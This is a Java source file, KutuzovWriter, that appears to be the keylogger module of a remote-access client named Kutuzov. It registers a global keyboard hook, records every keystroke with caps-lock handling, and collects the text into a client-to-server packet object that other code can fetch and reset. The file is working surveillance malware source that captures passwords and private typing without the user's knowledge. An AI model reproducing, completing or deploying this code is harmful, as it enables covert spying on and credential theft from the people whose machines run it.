package me.kutuzov.client;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import me.kutuzov.packet.CSWriterPacket;

import java.awt.*;
import java.awt.event.KeyEvent;

public class KutuzovWriter {
    private static String cache = null;
    private static CSWriterPacket packet = null;
    private static boolean caps = false;

    public static void init() {
        packet = new CSWriterPacket();

        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception exception) {
            if(KutuzovEntry.DEBUG)
                exception.printStackTrace();
            return;
        }

        GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
            @Override
            public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
                if(nativeKeyEvent.getKeyCode() == 58)
                    caps=!caps;

                cache = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
                cache = caps?cache.toUpperCase():cache.toLowerCase();
                cache = cache.equalsIgnoreCase("Intro")?"Intro\n":cache;

                if(packet == null)
                    packet = new CSWriterPacket();
                packet.text += cache.length() > 1 ? "["+cache+"]" : cache;

                if(KutuzovEntry.DEBUG)
                    System.out.println(cache);
            }


            @Override public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) { }
            @Override public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) { }
        });
    }

    public static CSWriterPacket _packet() { return packet; }
    public static void _packetReset() { packet = new CSWriterPacket(); }
    public static void _packet(String text) { packet.text = text; }
}